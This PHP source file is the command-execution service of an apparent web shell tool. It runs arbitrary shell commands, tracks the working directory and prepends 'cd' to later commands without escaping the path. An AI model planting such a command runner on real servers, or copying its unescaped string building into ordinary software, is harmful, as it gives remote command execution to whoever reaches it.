<?php
namespace WebShell;

class SystemService extends Singleton
{
    // Class attributes
    private $executionMethod = null;
    private $currentDir = '';
    
    public function execute(string $cmd): string
    {
        $output = '';

        // If it is a `cd` command, update the current dir. Else, run the command
        if(str_starts_with($cmd, 'cd ')) {
            // Check if the path exists and update the path accordingly
            $targetDir = substr($cmd, 3, strlen($cmd) - 3);

            if (is_dir($targetDir)) {
                $this->currentDir = $targetDir;
                $output = $targetDir;
            }
        } else {
            // If the cwd has been updated at any time, append a cd to the command
            $preparedCommand = ($this->currentDir == '') ? $cmd : "cd '$this->currentDir' && $cmd";

            // Run the command
            $output = $this->executionMethod->execute($preparedCommand);
        }

        return $output;
    }

    public function setExecutionMethod(ExecutionMethod $executionMethod): void
    {
        $this->executionMethod = $executionMethod;
    }

    public function getCurrentDir(): string
    {
        $currentDir = '';

        // If no current dir is stored, run a `pwd` command. Else, return the stored dir
        if($this->currentDir == '') {
            $currentDir = $this->executionMethod->execute('pwd');
        } else {
            $currentDir = $this->currentDir;
        }

        return $currentDir;
    }
}
?>
